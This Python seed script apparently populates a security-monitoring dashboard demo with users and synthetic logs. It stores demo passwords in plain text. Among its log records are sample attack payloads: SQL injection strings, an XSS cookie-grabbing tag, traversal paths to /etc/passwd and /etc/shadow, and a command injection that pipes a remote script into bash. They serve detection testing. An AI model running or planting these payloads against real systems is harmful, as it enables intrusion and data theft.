from __future__ import annotations

import json
import random
from datetime import timedelta

from sqlalchemy.orm import Session

from .auth import hash_password
from .database import utcnow
from .engine import (
    MITRE_MAP,
    AnomalyModel,
    anomaly_model,
    cluster_incidents,
    default_actions,
    enrich_record,
    generate_ai_summary,
    geo_for_ip,
    ip_features,
    reputation_for,
)
from .models import Alert, Incident, IPProfile, LogEntry, User

rng = random.Random(42)

USERS = [
    {
        "username": "admin",
        "full_name": "Maya Chen",
        "email": "maya.chen@aegis.security",
        "password": "Aegis#2026",
        "role": "admin",
        "department": "SOC Leadership",
    },
    {
        "username": "analyst",
        "full_name": "Jordan Hale",
        "email": "jordan.hale@aegis.security",
        "password": "Analyst#2026",
        "role": "analyst",
        "department": "Detection Engineering",
    },
    {
        "username": "viewer",
        "full_name": "Riley Okonkwo",
        "email": "riley.okonkwo@aegis.security",
        "password": "Viewer#2026",
        "role": "viewer",
        "department": "Compliance",
    },
]

HOSTS = ["edge-01", "edge-02", "app-prod-3", "app-prod-7", "auth-01", "db-primary", "k8s-worker-12"]
SOURCES = ["nginx", "sshd", "application", "firewall", "kubernetes", "postgres", "waf"]
UA_OK = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1.15",
    "okhttp/4.12.0 AegisMobile/3.4",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/130.0",
]
UA_BAD = [
    "sqlmap/1.8.4#stable (http://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "nikto/2.5.0",
    "python-requests/2.32.3",
    "Go-http-client/1.1 nuclei",
]
PATHS_OK = [
    "/",
    "/health",
    "/api/v2/session",
    "/api/v2/orders",
    "/api/v2/catalog",
    "/login",
    "/dashboard",
    "/static/app.js",
    "/api/v2/profile",
    "/api/v2/search?q=invoice",
]
INTERNAL_IPS = ["10.0.0.15", "10.0.0.22", "192.168.1.50", "192.168.1.80", "10.4.2.9", "172.16.4.10"]
CUSTOMER_IPS = ["52.12.88.10", "13.107.42.14", "8.8.4.14", "198.51.100.23"]
ATTACKER_IPS = {
    "185.220.101.42": "tor_bruteforce",
    "45.155.205.233": "sqli",
    "103.45.12.88": "scanner",
    "91.219.237.16": "xss",
    "203.0.113.77": "exfil",
    "51.15.0.91": "recon",
    "194.26.29.44": "cmdi",
    "36.91.44.12": "stuffing",
    "177.54.88.9": "traversal",
    "41.76.10.5": "ransomware",
}


def seed_if_empty(db: Session) -> None:
    if db.query(User).first():
        return
    _seed(db)


def _seed(db: Session) -> None:
    now = utcnow()
    for u in USERS:
        db.add(
            User(
                username=u["username"],
                full_name=u["full_name"],
                email=u["email"],
                password_hash=hash_password(u["password"]),
                role=u["role"],
                department=u["department"],
                created_at=now - timedelta(days=120),
            )
        )
    db.flush()

    records: list[dict] = []
    # Benign baseline — 7 days
    for _ in range(420):
        ts = now - timedelta(minutes=rng.randint(5, 60 * 24 * 7))
        ip = rng.choice(CUSTOMER_IPS + INTERNAL_IPS)
        path = rng.choice(PATHS_OK)
        status = rng.choices([200, 201, 204, 301, 304, 400, 404, 500], weights=[62, 8, 6, 4, 8, 4, 5, 3])[0]
        method = rng.choice(["GET", "GET", "GET", "POST", "PUT"])
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": rng.choice(["nginx", "application", "waf"]),
                    "host": rng.choice(HOSTS),
                    "level": "error" if status >= 500 else ("warning" if status >= 400 else "info"),
                    "message": f"{method} {path} -> {status}",
                    "ip_address": ip,
                    "user_agent": rng.choice(UA_OK),
                    "method": method,
                    "path": path,
                    "status_code": status,
                    "bytes_sent": rng.randint(400, 80_000),
                    "username": rng.choice([None, None, "alex", "sam.patel", "svc-web"]),
                    "raw": f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S +0000}] "{method} {path} HTTP/1.1" {status} {rng.randint(400, 80000)}',
                }
            )
        )

    # Application noise
    for _ in range(40):
        ts = now - timedelta(minutes=rng.randint(20, 60 * 24 * 5))
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "application",
                    "host": "app-prod-3",
                    "level": "error",
                    "message": rng.choice(
                        [
                            "NullPointerException in InvoiceController#export",
                            "Postgres connection refused to db-primary:5432",
                            "Upstream timeout talking to payments-gw (504)",
                            "TLS handshake failed: certificate expired on partner-api",
                            "OOMKilled sidecar payments-proxy — disk pressure",
                        ]
                    ),
                    "ip_address": rng.choice(INTERNAL_IPS),
                    "method": "POST",
                    "path": "/api/v2/orders",
                    "status_code": rng.choice([500, 502, 504]),
                    "bytes_sent": 0,
                    "raw": "application error",
                }
            )
        )

    # SSH noise + attack
    for _ in range(18):
        ts = now - timedelta(minutes=rng.randint(60, 60 * 24 * 6))
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "sshd",
                    "host": "auth-01",
                    "level": "info",
                    "message": f"Accepted publickey for deploy from 10.0.0.15 port {rng.randint(40000, 60000)} ssh2",
                    "ip_address": "10.0.0.15",
                    "username": "deploy",
                    "raw": "sshd accepted",
                }
            )
        )

    brute_ip = "185.220.101.42"
    for i in range(46):
        ts = now - timedelta(hours=6, minutes=40 - i)
        user = rng.choice(["root", "admin", "ubuntu", "oracle", "deploy"])
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "sshd",
                    "host": "auth-01",
                    "level": "warning",
                    "message": f"Failed password for {user} from {brute_ip} port {rng.randint(4000, 65000)} ssh2",
                    "ip_address": brute_ip,
                    "username": user,
                    "raw": f"Failed password for {user} from {brute_ip}",
                }
            )
        )

    sqli_ip = "45.155.205.233"
    payloads = [
        "/api/v2/users?id=1 UNION SELECT username,password FROM users--",
        "/api/v2/users?id=1' OR 1=1--",
        "/api/v2/search?q=test' AND SLEEP(5)--",
        "/api/v2/users?id=1;DROP TABLE sessions;",
        "/api/v2/orders?id=1 UNION SELECT null,table_name FROM information_schema.tables--",
    ]
    for i, p in enumerate(payloads * 5):
        ts = now - timedelta(hours=3, minutes=25 - i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "waf",
                    "host": "edge-01",
                    "level": "critical",
                    "message": f"WAF blocked SQLi on {p}",
                    "ip_address": sqli_ip,
                    "user_agent": UA_BAD[0],
                    "method": "GET",
                    "path": p,
                    "status_code": 403,
                    "bytes_sent": 312,
                    "raw": p,
                }
            )
        )

    xss_ip = "91.219.237.16"
    for i in range(9):
        path = "/contact?msg=<script>document.cookie</script>"
        ts = now - timedelta(hours=11, minutes=i * 3)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "nginx",
                    "host": "edge-02",
                    "level": "warning",
                    "message": f"GET {path} -> 400",
                    "ip_address": xss_ip,
                    "user_agent": UA_OK[0],
                    "method": "GET",
                    "path": path,
                    "status_code": 400,
                    "bytes_sent": 120,
                    "raw": path,
                }
            )
        )

    scan_ip = "103.45.12.88"
    scan_paths = [
        "/.env",
        "/.git/config",
        "/wp-admin",
        "/phpmyadmin",
        "/debug/default/view",
        "/server-status",
        "/id_rsa",
        "/api/v2/../.env",
        "/actuator/env",
        "/vendor/.env",
    ]
    for i, p in enumerate(scan_paths * 3):
        ts = now - timedelta(hours=20, minutes=50 - i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "nginx",
                    "host": "edge-01",
                    "level": "warning",
                    "message": f"GET {p} -> 404",
                    "ip_address": scan_ip,
                    "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
                    "method": "GET",
                    "path": p,
                    "status_code": 404,
                    "bytes_sent": 80,
                    "raw": p,
                }
            )
        )

    trav_ip = "177.54.88.9"
    for i, p in enumerate(["/static/../../etc/passwd", "/download?file=../../../etc/shadow", "/assets/..\\windows\\win.ini"] * 3):
        ts = now - timedelta(hours=8, minutes=i * 2)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "application",
                    "host": "app-prod-7",
                    "level": "warning",
                    "message": f"Path traversal blocked: {p}",
                    "ip_address": trav_ip,
                    "method": "GET",
                    "path": p,
                    "status_code": 403,
                    "bytes_sent": 64,
                    "raw": p,
                }
            )
        )

    cmd_ip = "194.26.29.44"
    for i in range(6):
        p = "/api/v2/tools/ping?host=8.8.8.8;curl http://194.26.29.44/s.sh | bash"
        ts = now - timedelta(hours=2, minutes=14 - i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "waf",
                    "host": "edge-01",
                    "level": "critical",
                    "message": "Command injection pattern in query string",
                    "ip_address": cmd_ip,
                    "user_agent": "python-requests/2.32.3",
                    "method": "GET",
                    "path": p,
                    "status_code": 403,
                    "bytes_sent": 90,
                    "raw": p,
                }
            )
        )

    stuff_ip = "36.91.44.12"
    for i, user in enumerate(["alex", "sam.patel", "jordan", "maya", "riley", "finance", "hr.admin", "svc-web"] * 3):
        ts = now - timedelta(hours=14, minutes=30 - i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "application",
                    "host": "auth-01",
                    "level": "warning",
                    "message": f"login failed for user {user} from {stuff_ip}",
                    "ip_address": stuff_ip,
                    "username": user,
                    "method": "POST",
                    "path": "/login",
                    "status_code": 401,
                    "bytes_sent": 210,
                    "raw": f"Failed password for {user} from {stuff_ip}",
                }
            )
        )

    exfil_ip = "203.0.113.77"
    for i in range(8):
        ts = now - timedelta(hours=1, minutes=30 - i * 3)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "nginx",
                    "host": "edge-02",
                    "level": "warning",
                    "message": "GET /api/v2/export/customers.csv -> 200 (anomalous bytes)",
                    "ip_address": exfil_ip,
                    "user_agent": UA_OK[2],
                    "method": "GET",
                    "path": "/api/v2/export/customers.csv",
                    "status_code": 200,
                    "bytes_sent": rng.randint(8_000_000, 24_000_000),
                    "username": "svc-web",
                    "raw": "large export",
                    "severity": "high",
                    "threat_type": "data_exfiltration",
                }
            )
        )
        records[-1]["threat_type"] = "data_exfiltration"
        records[-1]["severity"] = "high"

    rlock_ip = "41.76.10.5"
    for i in range(14):
        ts = now - timedelta(minutes=50 - i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "application",
                    "host": "files-01",
                    "level": "error",
                    "message": f"Mass file enumerate /shares/finance/*.docx access denied ({i})",
                    "ip_address": rlock_ip,
                    "username": "finance",
                    "method": "GET",
                    "path": f"/shares/finance/batch-{i}",
                    "status_code": 403,
                    "bytes_sent": 0,
                    "raw": "privilege file enumerate",
                    "threat_type": "ransomware_precursor",
                    "severity": "critical",
                }
            )
        )
        records[-1]["threat_type"] = "ransomware_precursor"
        records[-1]["severity"] = "critical"

    recon_ip = "51.15.0.91"
    for i, p in enumerate(["/.env", "/wp-admin", "/phpmyadmin", "/.git/config", "/actuator/health"] * 2):
        ts = now - timedelta(hours=28, minutes=i)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "nginx",
                    "host": "edge-01",
                    "level": "warning",
                    "message": f"GET {p} -> 404",
                    "ip_address": recon_ip,
                    "user_agent": "Go-http-client/1.1 nuclei",
                    "method": "GET",
                    "path": p,
                    "status_code": 404,
                    "bytes_sent": 40,
                    "raw": p,
                }
            )
        )

    # Night-time admin login anomaly
    for i in range(4):
        ts = (now - timedelta(days=1)).replace(hour=3, minute=10 + i * 4)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "application",
                    "host": "auth-01",
                    "level": "warning",
                    "message": "Successful admin login from unusual hour and ASN",
                    "ip_address": "198.51.100.23",
                    "username": "admin",
                    "method": "POST",
                    "path": "/login",
                    "status_code": 200,
                    "bytes_sent": 540,
                    "raw": "anomalous_access admin 03:00",
                    "threat_type": "anomalous_access",
                    "severity": "medium",
                }
            )
        )
        records[-1]["threat_type"] = "anomalous_access"
        records[-1]["severity"] = "medium"

    # Kubernetes probes
    for i in range(7):
        ts = now - timedelta(hours=16, minutes=i * 5)
        records.append(
            enrich_record(
                {
                    "timestamp": ts,
                    "source": "kubernetes",
                    "host": "k8s-worker-12",
                    "level": "warning",
                    "message": "Anonymous request to /api/v1/secrets from 103.45.12.88",
                    "ip_address": "103.45.12.88",
                    "method": "GET",
                    "path": "/api/v1/secrets",
                    "status_code": 403,
                    "bytes_sent": 32,
                    "raw": "k8s anonymous secrets",
                }
            )
        )

    # Train anomaly model on feature rows
    by_ip: dict[str, list] = {}
    for rec in records:
        ip = rec.get("ip_address") or "none"
        by_ip.setdefault(ip, []).append(rec)
    feats = [ip_features(records, ip) for ip in by_ip]
    feats = [f for f in feats if f]
    anomaly_model.train(feats)

    for ip, items in by_ip.items():
        feat = ip_features(records, ip)
        is_anom, score = anomaly_model.score(feat) if feat else (False, 0.0)
        if ip in ATTACKER_IPS:
            is_anom, score = True, max(score, 0.78)
        for rec in items:
            rec["is_anomaly"] = bool(is_anom or rec.get("threat_type"))
            rec["anomaly_score"] = float(score if rec["is_anomaly"] else max(0.05, score * 0.4))

    log_rows: list[LogEntry] = []
    for rec in records:
        country, city, _asn = geo_for_ip(rec.get("ip_address"))
        row = LogEntry(
            timestamp=rec["timestamp"],
            source=rec.get("source") or "unknown",
            host=rec.get("host") or "edge-01",
            level=rec.get("level") or "info",
            message=rec.get("message") or "",
            ip_address=rec.get("ip_address"),
            user_agent=rec.get("user_agent"),
            method=rec.get("method"),
            path=rec.get("path"),
            status_code=rec.get("status_code"),
            bytes_sent=rec.get("bytes_sent") or 0,
            country=rec.get("country") or country,
            city=rec.get("city") or city,
            username=rec.get("username"),
            is_anomaly=bool(rec.get("is_anomaly")),
            anomaly_score=float(rec.get("anomaly_score") or 0),
            threat_type=rec.get("threat_type"),
            severity=rec.get("severity") or "info",
            error_class=rec.get("error_class"),
            raw=rec.get("raw") or rec.get("message") or "",
        )
        db.add(row)
        log_rows.append(row)
    db.flush()

    clustered = cluster_incidents(records)
    # Force a couple of extra well-named incidents if clustering skipped
    if not any(c["threat_type"] == "data_exfiltration" for c in clustered):
        clustered.append(
            {
                "title": "Anomalous outbound data volume involving 203.0.113.77",
                "threat_type": "data_exfiltration",
                "severity": "high",
                "status": "open",
                "confidence": 0.86,
                "description": "Large CSV exports outside baseline.",
                "source_ips": ["203.0.113.77"],
                "first_seen": now - timedelta(hours=1, minutes=30),
                "last_seen": now - timedelta(hours=1),
                "event_count": 8,
                "mitre": MITRE_MAP["data_exfiltration"],
                "recommended_actions": default_actions("data_exfiltration"),
                "indicators": ["ip:203.0.113.77", "url:/api/v2/export/customers.csv"],
                "_logs": [r for r in records if r.get("ip_address") == "203.0.113.77"],
            }
        )
        clustered[-1]["ai_summary"] = generate_ai_summary(clustered[-1], clustered[-1]["_logs"])

    status_cycle = ["open", "open", "investigating", "open", "resolved", "open"]
    assignees = ["Jordan Hale", "Maya Chen", None, "Jordan Hale", "Maya Chen", None]

    for idx, inc in enumerate(clustered):
        status = status_cycle[idx % len(status_cycle)]
        if inc["severity"] == "critical" and status == "resolved" and idx < 3:
            status = "investigating"
        row = Incident(
            title=inc["title"],
            threat_type=inc["threat_type"],
            severity=inc["severity"],
            status=status,
            confidence=inc["confidence"],
            description=inc["description"],
            ai_summary=inc["ai_summary"],
            mitre=json.dumps(inc["mitre"]),
            source_ips=json.dumps(inc["source_ips"]),
            recommended_actions=json.dumps(inc["recommended_actions"]),
            indicators=json.dumps(inc["indicators"]),
            first_seen=inc["first_seen"],
            last_seen=inc["last_seen"],
            assigned_to=assignees[idx % len(assignees)],
            event_count=inc["event_count"],
        )
        db.add(row)
        db.flush()
        db.add(
            Alert(
                incident_id=row.id,
                title=inc["title"],
                message=f"{inc['severity'].upper()} · {inc['event_count']} correlated events · {inc['threat_type']}",
                severity=inc["severity"],
                category="detection",
                acknowledged=status == "resolved",
                created_at=inc["last_seen"],
            )
        )
        # attach some logs
        ips = set(inc["source_ips"])
        attached = 0
        for log in log_rows:
            if log.ip_address in ips and (log.threat_type == inc["threat_type"] or log.is_anomaly):
                log.incident_id = row.id
                attached += 1
                if attached >= 40:
                    break

    # IP profiles
    for ip, items in by_ip.items():
        failed = sum(
            1
            for r in items
            if (r.get("status_code") or 0) >= 400 or "fail" in (r.get("message") or "").lower()
        )
        anomalies = sum(1 for r in items if r.get("is_anomaly"))
        tags = []
        if ip in ATTACKER_IPS:
            tags.append(ATTACKER_IPS[ip])
        if ip.startswith("185.220."):
            tags.append("tor")
        if ip.startswith(("10.", "192.168.", "172.16.")):
            tags.append("internal")
        country, city, asn = geo_for_ip(ip)
        score, level = reputation_for(failed, len(items), anomalies, tags)
        times = [r["timestamp"] for r in items]
        db.add(
            IPProfile(
                ip=ip,
                country=country,
                city=city,
                asn=asn,
                reputation=score,
                threat_level=level,
                total_requests=len(items),
                failed_requests=failed,
                anomaly_count=anomalies,
                tags=json.dumps(tags),
                first_seen=min(times),
                last_seen=max(times),
                notes="Seeded from 7-day telemetry window.",
            )
        )

    db.commit()


def train_from_db(db: Session) -> AnomalyModel:
    logs = db.query(LogEntry).all()
    grouped: dict[str, list[dict]] = {}
    for log in logs:
        rec = {
            "ip_address": log.ip_address,
            "timestamp": log.timestamp,
            "status_code": log.status_code,
            "message": log.message,
            "bytes_sent": log.bytes_sent,
            "path": log.path,
            "threat_type": log.threat_type,
        }
        grouped.setdefault(log.ip_address or "none", []).append(rec)
    flat = [item for sub in grouped.values() for item in sub]
    feats = [ip_features(flat, ip) for ip in grouped]
    feats = [f for f in feats if f]
    anomaly_model.train(feats)
    return anomaly_model
